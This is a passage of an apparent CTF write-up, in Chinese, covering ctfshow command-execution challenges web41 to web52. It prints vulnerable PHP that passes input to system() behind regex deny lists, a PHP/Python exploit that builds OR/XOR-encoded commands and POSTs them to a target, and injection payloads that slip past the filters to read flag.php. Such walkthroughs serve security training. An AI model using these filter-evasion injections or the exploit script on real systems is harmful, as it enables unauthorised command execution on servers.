class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-comment">//异或</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xorRce</span>(<span class="hljs-params"><span class="hljs-variable">$par1</span>, <span class="hljs-variable">$par2</span></span>)</span>&#123;<br>    <span class="hljs-variable">$result</span> = (<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$par1</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$par2</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-comment">//取反</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">negateRce</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br>    <span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><br>    <span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br>    <span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">//mode=1代表或，2代表异或，3代表取反</span><br><span class="hljs-comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-variable">$mode</span>, <span class="hljs-variable">$preg</span>=<span class="hljs-string">&#x27;/[0-9]/i&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span>!=<span class="hljs-number">3</span>)&#123;<br>        <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                    <span class="hljs-variable">$hex_i</span> = <span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$hex_i</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                    <span class="hljs-variable">$hex_j</span> = <span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$hex_j</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$par1</span> = <span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-variable">$hex_i</span>;<br>                    <span class="hljs-variable">$par2</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                    <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span>==<span class="hljs-number">1</span>)&#123;<br>                        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">orRce</span>(<span class="hljs-variable">$par1</span>, <span class="hljs-variable">$par2</span>);<br>                    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span>==<span class="hljs-number">2</span>)&#123;<br>                        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">xorRce</span>(<span class="hljs-variable">$par1</span>, <span class="hljs-variable">$par2</span>);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$res</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$res</span>)&lt;=<span class="hljs-number">126</span>)&#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$res</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$par1</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$par2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">negateRce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">generate</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>);<br><span class="hljs-comment">//1代表模式，后面的是过滤规则</span><br><br></code></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;php rce_or.php&quot;</span>)  <span class="hljs-comment">#没有将php写入环境变量需手动运行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(argv)!=<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   exit(<span class="hljs-number">0</span>)<br>url=argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))<br>   data=&#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<br>       &#125;<br>   r=requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] result:\n&quot;</span>+r.text)<br><br></code></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41_ctfshow web41-CSDN博客</a></p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">/dev/null 是一个特殊的设备文件，它丢弃一切写入其中的数据 可以将它 视为一个黑洞, 它等效于只写文件, 写入其中的所有内容都会消失, 尝试从中读取或输出不会有任何结果。<br>2&gt;&amp;1:<br>0 =&gt; stdin  标准输入<br>1 =&gt; stdout 标准输出<br>2 =&gt; stderr 标准错误输出<br>2&gt;&amp;1代表将stderr重定向到文件描述符为1的文件(即/dev/stdout)中<br><br>如果直接执行命令，结果会输入到&gt;/dev/null,并且报错也会输入进去，不会有任何回显<br>所以要想办法截断后面的命令：<br>?c=cat flag.php%0a<br>?c=cat flag.php||<br>?c=cat flag.php%26%26<br>?c=cat flag.php;<br></code></pre></td></tr></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">过滤了;和cat<br>可以用%0a和&amp;&amp;用url编码<br>?c=tac flag.php%0a<br>?c=tac flag.php%26%26<br></code></pre></td></tr></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对flag的过滤，用*绕过<br>?c=tac f*%0a<br>?c=tac f*%26%26<br></code></pre></td></tr></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对空格的过滤<br>用$&#123;IFS&#125;、$IFS$1、%09  都可以绕过空格过滤<br>?c=tac$&#123;IFS&#125;f*%0a<br>?c=tac$IFS$1f*%0a<br>?c=tac%09f*%0a<br></code></pre></td></tr></table></figure><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了数字、$、*的过滤，用？代替*<br>?c=tac%09fla?.php%0a<br></code></pre></td></tr></table></figure><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了命令的绕过，不影响<br>?c=tac%09fla?.php%0a<br></code></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">更严格的过滤，但还是不影响<br>?c=tac%09fla?.php%0a<br></code></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对%的过滤，依旧不影响<br>?c=tac%09fla?.php%0a<br></code></pre></td></tr></table></figure><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">制表符%09和&amp;被过滤，<br>我们可以使用 &lt; 符号将一个文件的内容作为命令的输入，&#x27;&#x27;替代?的作用，||代替%0a<br>?c=tac&lt;fla&#x27;&#x27;g.php%7C%7C<br></code></pre></td></tr></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对tac的过滤，用nl代替tac<br>?c=nl&lt;fla&#x27;&#x27;g.php%7C%7C<br></code></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span 